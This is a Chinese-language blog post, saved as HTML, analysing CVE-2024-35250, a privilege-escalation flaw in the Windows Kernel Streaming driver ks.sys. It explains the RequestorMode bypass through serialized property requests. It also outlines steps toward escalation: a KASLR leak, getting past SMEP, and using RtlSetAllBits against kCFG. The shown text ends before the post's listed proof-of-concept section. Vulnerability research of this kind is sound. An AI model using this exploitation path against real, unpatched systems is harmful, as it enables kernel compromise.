@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CVE-2024-35250">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2024-35250分析">
+<meta property="og:url" content="https://ixout.github.io/posts/51238/index.html">
+<meta property="og:site_name" content="ixout&#39;s blog">
+<meta property="og:description" content="CVE-2024-35250">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/5.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/623423423.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/7asd123.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/8324sada1123mv.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/9zxcyuk23890dsa.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/104768123781.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/11asghasd32234.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-08_222658.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-08_2232551.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-08_224117.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/23312312312312.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/24712983712893.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-09_103118.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-09_103612.png">
+<meta property="article:published_time" content="2025-04-07T14:31:18.000Z">
+<meta property="article:modified_time" content="2025-04-09T08:18:22.847Z">
+<meta property="article:author" content="ixout">
+<meta property="article:tag" content="windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/5.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CVE-2024-35250分析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/51089/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ixout.github.io/posts/51238/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ixout.github.io/posts/51238/&text=CVE-2024-35250分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ixout.github.io/posts/51238/&title=CVE-2024-35250分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ixout.github.io/posts/51238/&is_video=false&description=CVE-2024-35250分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CVE-2024-35250分析&body=Check out this article: https://ixout.github.io/posts/51238/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ixout.github.io/posts/51238/&title=CVE-2024-35250分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ixout.github.io/posts/51238/&title=CVE-2024-35250分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ixout.github.io/posts/51238/&title=CVE-2024-35250分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ixout.github.io/posts/51238/&title=CVE-2024-35250分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ixout.github.io/posts/51238/&name=CVE-2024-35250分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ixout.github.io/posts/51238/&t=CVE-2024-35250分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%B5%81%E5%BC%8F%E4%BC%A0%E8%BE%93"><span class="toc-number">1.</span> <span class="toc-text">内核流式传输</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E4%BA%A4%E4%BA%92"><span class="toc-number">1.1.</span> <span class="toc-text">设备交互</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E8%B7%AF%E5%BE%84"><span class="toc-number">1.1.1.</span> <span class="toc-text">设备路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E8%AE%BE%E5%A4%87"><span class="toc-number">1.1.2.</span> <span class="toc-text">枚举设备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%B5%81%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.1.3.</span> <span class="toc-text">内核流对象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%B5%81%E5%BC%8F%E4%BC%A0%E8%BE%93%E6%9E%B6%E6%9E%84"><span class="toc-number">1.2.</span> <span class="toc-text">内核流式传输架构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ksthunk"><span class="toc-number">1.2.1.</span> <span class="toc-text">ksthunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ks"><span class="toc-number">1.2.2.</span> <span class="toc-text">ks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IOCTLKS-%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.3.</span> <span class="toc-text">IOCTLKS* 的工作流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%80%E5%9C%A8"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞所在</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EoP"><span class="toc-number">2.3.</span> <span class="toc-text">EoP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POC"><span class="toc-number">3.</span> <span class="toc-text">POC</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CVE-2024-35250分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ixout</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-07T14:31:18.000Z" class="dt-published" itemprop="datePublished">2025-04-07</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/pwn/">pwn</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/windows/" rel="tag">windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>CVE-2024-35250是DEVCORE发现的一个可利用性极高的内核提权漏洞(发现者是著名大佬Angelboy)</p>
+<p><a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35250">微软公开的介绍</a></p>
+<p>也可以阅读Angelboy大佬的文章<a target="_blank" rel="noopener" href="https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/">从 Windows 内核流出的漏洞 - 核心代理 - 第一部分 | DEVCORE</a></p>
+<h1 id="内核流式传输"><a href="#内核流式传输" class="headerlink" title="内核流式传输"></a>内核流式传输</h1><p>在进行漏洞分析之前需要先了解一些前置知识</p>
+<p>Windows内核流式传输框架(Windows Kernel Streaming Framework)是Windows操作系统中用于处理实时多媒体数据流的核心组件</p>
+<p>当打开摄像头、开启音效以及麦克风等音频设备时，系统需要将这些设备中的声音、影像等相关数据读取到 RAM 中, 这时就会用上内核流式传输框架</p>
+<p>内核流有三种多媒体驱动模型:</p>
+<ul>
+<li>端口类</li>
+<li>AVStream</li>
+<li>流类(已经过时, 现代设备基本不会采用该模型)</li>
+</ul>
+<p><strong>端口类</strong></p>
+<p>主要用于音频硬件驱动(如声卡等)</p>
+<p>由微软提供端口驱动（Port Driver），处理通用音频功能（如混音、格式转换）。硬件厂商只需实现微型端口驱动（Miniport Driver），专注于硬件控制。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/5.png" alt=""></p>
+<p><strong>AVStream</strong></p>
+<p>适用于视频采集、流媒体处理（如摄像头、视频捕获卡）</p>
+<p>取代了旧版 <strong>KS（Kernel Streaming）</strong> 框架，提供更现代的驱动模型。</p>
+<p>支持即插即用（PnP）、电源管理，简化了过滤器（Filter）和管脚（Pin）的实现。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/623423423.png" alt=""></p>
+<h2 id="设备交互"><a href="#设备交互" class="headerlink" title="设备交互"></a>设备交互</h2><p>对于这类设备其实交互与普通设备并没有太大区别, 同样是通过CreateFile打开设备获得句柄进行操作</p>
+<h3 id="设备路径"><a href="#设备路径" class="headerlink" title="设备路径"></a>设备路径</h3><p>但区别在于他们的名字并不像<code>\Devcie\NamedPipe</code> 这样，而是会像下面这样的路径 :</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\\hdaudio#subfunc_01&amp;ven_8086&amp;dev_2812&amp;nid_0001&amp;subsys_00000000&amp;rev_1000#6&amp;2f1f346a&amp;0&amp;0002&amp;0000001d#&#123;6994ad04-93ef-11d0-a3cc-00a0c9223196&#125;\ehdmiouttopo</span><br></pre></td></tr></table></figure>
+<p>组成成分</p>
+<ol>
+<li><p>前缀 <code>\\?\</code></p>
+<p>表示使用 Windows 的扩展长度路径格式（支持超长路径名）</p>
+</li>
+<li><p>设备类型标识</p>
+<p><code>hdaudio</code>：表示设备为 <strong>高清音频控制器</strong>（如 Intel HD Audio）</p>
+<p>类似还有：</p>
+<ul>
+<li><code>usb#vid_xxxx&amp;pid_xxxx</code>（USB 摄像头）</li>
+<li><code>pci#ven_xxxx&amp;dev_xxxx</code>（PCI 视频采集卡）</li>
+</ul>
+</li>
+<li><p>硬件标识符</p>
+<p><code>ven_8086</code>：厂商 ID</p>
+<p><code>dev_2812</code>：设备型号</p>
+<p><code>nid_0001</code>：节点 ID</p>
+</li>
+<li><p>GUID 部分</p>
+<p><code>&#123;6994ad04-93ef-11d0-a3cc-00a0c9223196&#125;</code>：Windows 定义的设备接口类 GUID（此处是 <strong>KSCATEGORY_AUDIO</strong>，表示音频设备）</p>
+<p>其他常见 GUID：</p>
+<ul>
+<li>摄像头：<code>&#123;65E8773D-8F56-11D0-A3B9-00A0C9223196&#125;</code></li>
+<li>视频采集：<code>&#123;53172480-4791-11D0-A5D6-28DB04C10000&#125;</code></li>
+</ul>
+</li>
+<li><p>功能端点</p>
+<p><code>ehdmiouttopo</code>：表示设备的特定功能端点（此处是 HDMI 音频输出拓扑）</p>
+</li>
+</ol>
+<h3 id="枚举设备"><a href="#枚举设备" class="headerlink" title="枚举设备"></a>枚举设备</h3><p>由于硬件配置、厂商 ID、设备实例 ID 等差异，音频/视频设备的路径（如 <code>\\?\hdaudio#...</code>）是动态生成的，<strong>不能硬编码</strong>在代码中</p>
+<p>要使用 Windows 提供的设备管理 API（如 <code>SetupDi*</code> 系列函数）动态获取设备路径</p>
+<p><code>SetupDi*</code>系列核心api</p>
+<ol>
+<li><p><strong><code>SetupDiGetClassDevs</code></strong>获取指定设备类别（如音频、摄像头）的所有设备列表。</p>
+<p>参数：</p>
+<ul>
+<li><code>ClassGuid</code>：设备类别的 GUID（如 <code>KSCATEGORY_AUDIO</code>）。</li>
+<li><code>Flags</code>：控制枚举范围（如 <code>DIGCF_PRESENT</code> 只枚举当前连接的设备）。</li>
+</ul>
+</li>
+<li><p><strong><code>SetupDiEnumDeviceInterfaces</code></strong>遍历设备列表，获取每个设备的接口信息（包括设备路径）。</p>
+</li>
+<li><p><strong><code>SetupDiGetDeviceInterfaceDetail</code></strong>获取设备的详细路径（即 <code>\\?\hdaudio#...</code> 格式的字符串）。</p>
+</li>
+</ol>
+<p>当然也可以直接使用ks简化的api, 快速打开指定类别的第一个可用设备</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Ks.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;KsMedia.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE g_hDevice;</span><br><span class="line">HRESULT hr = KsOpenDefaultDevice(</span><br><span class="line">    KSCATEGORY_VIDEO_CAMERA,</span><br><span class="line">    GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">    &amp;g_hDevice</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>本质还是对 <code>SetupDiGetClassDevs</code> + <code>CreateFile</code> 的封装</p>
+<h3 id="内核流对象"><a href="#内核流对象" class="headerlink" title="内核流对象"></a>内核流对象</h3><p>Windows内核流式传输框架(Kernel Streaming)在启用设备后会在内核中创建关键对象实例</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/7asd123.png" alt=""></p>
+<p><strong>KS过滤器(KS Filter)</strong></p>
+<p>采用类似”黑盒”的设计理念，开发者通过统一接口与过滤器交互</p>
+<p>每个KS过滤器通常代表一个物理设备或设备的特定功能模(不仅限于物理设备，也可以用于虚拟设备或软件层面的处理), 作为数据处理的中心枢纽，所有流数据都要通过过滤器进行处理</p>
+<p>例如: 打开音频设备后会对应到一个音频过滤器，过滤器可能由多个节点组成，节点对流数据进行处理。音频过滤器通常会处理音频数据流，但它可能包含多个子功能（如解码、编码、效果处理等）</p>
+<p><strong>KS引脚(KS Pin)</strong></p>
+<p>作为过滤器的数据输入/输出端点, 必须通过Pin实例才能对Filter进行数据读写操作</p>
+<p>主要作用有:明确区分输入端和输出端, 定义支持的数据格式和传输特性, 控制数据流的方向和行为</p>
+<p><strong>核心属性系统</strong></p>
+<p>所有KS对象(过滤器和Pin)都通过属性系统暴露其功能, 使用GUID标识的属性标识, 例如支持的格式、传输特性等</p>
+<p>开发者可以使用IOCTL_KS_PROPERTY来设置和获取属性，控制设备的行为</p>
+<p><strong>例子</strong></p>
+<p>例如应用程序从视频摄像头读取数据的流程大致如下图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/8324sada1123mv.png" alt=""></p>
+<ol>
+<li><p><strong>设备初始化</strong>：</p>
+<p>使用<code>CreateFile</code>或<code>KsOpenDefaultDevice</code>获取设备句柄</p>
+</li>
+<li><p><strong>Pin实例创建</strong>：</p>
+<p>在过滤器上创建特定Pin的实例, 获取代表该Pin的独立句柄</p>
+</li>
+<li><p><strong>流配置</strong>：</p>
+<p>使用<code>IOCTL_KS_PROPERTY</code>进行属性设置, 例如视频格式(如MJPG/YUY2), 帧率(如30fps)等</p>
+<p>同时将Pin状态设置为运行(Run)状态</p>
+</li>
+<li><p><strong>数据采集</strong>：</p>
+<p>使用<code>IOCTL_KS_READ_STREAM</code>从Pin读取视频帧数据</p>
+</li>
+</ol>
+<h2 id="内核流式传输架构"><a href="#内核流式传输架构" class="headerlink" title="内核流式传输架构"></a>内核流式传输架构</h2><p>整个内核流式传输架构大致如下图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/9zxcyuk23890dsa.png" alt=""></p>
+<p>其中包含两个重要的驱动ksthunk.sys与ks.sys</p>
+<h3 id="ksthunk"><a href="#ksthunk" class="headerlink" title="ksthunk"></a>ksthunk</h3><p>内核流式 WOW Thunk 服务驱动程序</p>
+<p>在调用 DeviceIoControl 应用后，在 Kernel Streaming 的入口点 ，但它功能很简单，负责将 WoW64 进程中的 32 位请求转换成 64 位请求，使得下层的驱动就不必为 32 位结构另外处理。</p>
+<h3 id="ks"><a href="#ks" class="headerlink" title="ks"></a>ks</h3><p>内核连接和流架构库</p>
+<p>内核流媒体的核心组件之一，它是内核流媒体的库函数，负责转发 IOCTL_KS_PROPERTY 等请求到对应设备的驱动程序中，同时也会负责处理 AVStream 的相关功能。</p>
+<h3 id="IOCTLKS-的工作流程"><a href="#IOCTLKS-的工作流程" class="headerlink" title="IOCTLKS* 的工作流程"></a>IOCTL<em>KS</em>* 的工作流程</h3><p>当调用 DeviceIoControl 时, 用户的请求处理流程大致就如下图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/104768123781.png" alt=""></p>
+<p>而到第 6 步时 ks.sys 就会根据请求的 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ksproperty-structure">属性 </a>来决定要交给哪个驱动及处理器来处理请求</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/11asghasd32234.png" alt=""></p>
+<p>最终再转发给相应的驱动程序，如上图最后转发给 portcls 中的 handler 来操作音频设备</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>作者的原文中还详细地描述了漏洞发现的思路与分析过程, 感兴趣可以看作者的文章</p>
+<p>这里我们就直接进行漏洞的介绍了</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>_ETHREAD线程对象有一个字段PreviousMode, 用于标识参数值的来源是用户模式还是内核模式</p>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/previousmode">PreviousMode - Windows drivers | Microsoft Learn</a></p>
+<p>其有两种可能<strong><code>UserMode</code></strong>和<strong><code>KernelMode</code></strong>, 该值会影响内核是否启用某些操作来保障安全性</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left">调用方式</th>
+<th style="text-align:left">PreviousMode 设置</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">用户模式应用调用 <code>NtXxx</code></td>
+<td style="text-align:left">自动设为 <code>UserMode</code></td>
+<td style="text-align:left">系统调用陷阱处理程序（如 <code>syscall</code> / <code>sysenter</code>）会设置 <code>PreviousMode = UserMode</code>。</td>
+</tr>
+<tr>
+<td style="text-align:left">内核驱动调用<code>NtXxx</code></td>
+<td style="text-align:left">保持调用线程的原有值</td>
+<td style="text-align:left">如果线程原本是用户模式调用链的一部分，<code>PreviousMode</code> 可能仍是 <code>UserMode</code>，导致错误。</td>
+</tr>
+<tr>
+<td style="text-align:left">内核驱动调用 <code>ZwXxx</code></td>
+<td style="text-align:left">强制设为 <code>KernelMode</code></td>
+<td style="text-align:left"><code>ZwXxx</code> 是 <code>NtXxx</code> 的包装器，会临时覆盖 <code>PreviousMode</code> 为 <code>KernelMode</code>，避免安全检查。</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>与之相关有IRP的<strong>RequestorMode</strong>字段, 在内核驱动中常常会用到这个字段决定是否需要对用户的requests做一些额外的安全检查</p>
+<p>很多时候RequestorMode的值就来自于PreviousMode</p>
+<p>那么这个机制就存在一个问题: 即如果用户态发送IRP请求进入内核态后调用了Zw<em>函数, 而Zw\</em>函数本身又发起了一个IRP请求</p>
+<p>此时PreviousMode已经变为KernelMode, 但是后来发起的IRP请求却依然可能包含有用户传递的内容, 从而使用户的请求规避了某些安全检查</p>
+<p>事实上这种情况确实存在</p>
+<p>内核驱动中可以使用 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest">IoBuildDeviceIoControlRequest</a> 这个方法去创建一个 DeviceIoControl 的 IRP，该函数会创建好 IRP，然后后续去调用 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-iofcalldriver">IofCallDriver</a>，这样就可以在内核驱动中调用 IOCTL</p>
+<blockquote>
+<p>If the caller supplies an <em>InputBuffer</em> or <em>OutputBuffer</em> parameter, this parameter must point to a buffer that resides in system memory. The caller is responsible for validating any parameter values that it copies into the input buffer from a user-mode buffer. The input buffer might contain parameter values that are interpreted differently depending on whether the originator of the request is a user-mode application or a kernel-mode driver. In the IRP that <strong>IoBuildDeviceIoControlRequest</strong> returns, the <strong>RequestorMode</strong> field is always set to <strong>KernelMode</strong>. This value indicates that the request, and any information contained in the request, is from a trusted, kernel-mode component.</p>
+</blockquote>
+<p>根据微软的文档可以知道, 如果没有特别去设置 RequestorMode 就会直接以 KernelMode 形式去调用 IOCTL</p>
+<h2 id="漏洞所在"><a href="#漏洞所在" class="headerlink" title="漏洞所在"></a>漏洞所在</h2><p>在ks.sys中就存在对IoBuildDeviceIoControlRequest方法的使用</p>
+<p>通过反编译ks.sys可以发现这个函数KsSynchronousIoControlDevice完美符合条件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS __stdcall <span class="title function_">KsSynchronousIoControlDevice</span><span class="params">(</span></span><br><span class="line"><span class="params">        PFILE_OBJECT FileObject,</span></span><br><span class="line"><span class="params">        KPROCESSOR_MODE RequestorMode,</span></span><br><span class="line"><span class="params">        ULONG IoControl,</span></span><br><span class="line"><span class="params">        PVOID InBuffer,</span></span><br><span class="line"><span class="params">        ULONG InSize,</span></span><br><span class="line"><span class="params">        PVOID OutBuffer,</span></span><br><span class="line"><span class="params">        ULONG OutSize,</span></span><br><span class="line"><span class="params">        PULONG BytesReturned)</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-08_222658.png" alt=""></p>
+<p>尽管这并不是一个Zw*函数, 但是RequestorMode却作为一个参数可控</p>
+<p>并且ks.sys中在使用这个函数时, 往往将RequestorMode设置为0</p>
+<p>例如UnserializePropertySet</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-08_2232551.png" alt=""></p>
+<p>memmove的第二个参数其实应该是CurrentStackLocation-&gt;Parameters.DeviceIoControl.Type3InputBuffer也就是用户可控的内容</p>
+<p>OutBuffer也来自原先的IRP请求, 也就是说到这里已经拥有了RequestorMode为KernelMode且存在用户可控参数的原语了</p>
+<p>那如何触发UnserializePropertySet函数呢</p>
+<p>在 Kernel Streaming 的 IOCTL_KS_PROPERTY 功能中，为了提高效率</p>
+<p>提供了 <code>KSPROPERTY_TYPE_SERIALIZESET</code> 和 <code>KSPROPERTY_TYPE_UNSERIALIZESET</code> 功能允许用户通过 <strong>单次调用</strong> 与多个 Property 进行操作。</p>
+<p>当我们使用这个功能时，这些请求将被 KsPropertyHandler 函数分解成多个调用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-08_224117.png" alt=""></p>
+<p>过程如图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/23312312312312.png" alt=""></p>
+<p>UnserializePropertySet处理又会调用KsSynchronousIoControlDevice 重新做一次 IOCTL，而此时新的 <code>Irp-&gt;RequestorMode</code> 就变成了 KernelMode(0) </p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/24712983712893.png" alt=""></p>
+<h2 id="EoP"><a href="#EoP" class="headerlink" title="EoP"></a>EoP</h2><p>现在已经存在KernelMode下的任意IOCTL_KS_PROPERTY, 现在要做的就开始寻找可触发利用点</p>
+<p>在ksthunk.sys中DispatchIoctl负责对请求进行分发</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-09_103118.png" alt=""></p>
+<p>如果请求不是32位的, 就会调用CKSThunkDevice::CheckIrpForStackAdjustmentNative</p>
+<p>其中3080195是IOCTL_KS_PROPERTY的调用号</p>
+<p>而在CKSThunkDevice::CheckIrpForStackAdjustmentNative函数存在如下代码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-09_103612.png" alt=""></p>
+<p>如果是直接从用户态调用这个过程, 那么会检查RequestorMode直接返回错误</p>
+<p>但现在是从内核态发起的调用, 那么就会执行下面的将用户输入作为函数调用, 并且第一个参数可控</p>
+<p>那现在要面对的就是KASLR, SMEP, KCFG等保护</p>
+<p>对于前两者在Windows下解决都不算困难</p>
+<ul>
+<li>KASLR使用EnumDeviceDrivers或NtQuerySystemInformation等api即可获得内核加载基址</li>
+<li>SMEP则直接调用内核代码即可</li>
+</ul>
+<p>CFG保护会检查通过指针间接调用的函数是否在合法的函数表中</p>
+<p> <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlsetallbits">RtlSetAllBits</a>就是一个能够被利用的函数, 其是 kCFG 中合法的 function，而且也只需要控制一个参数_RTL_BITMAP</p>
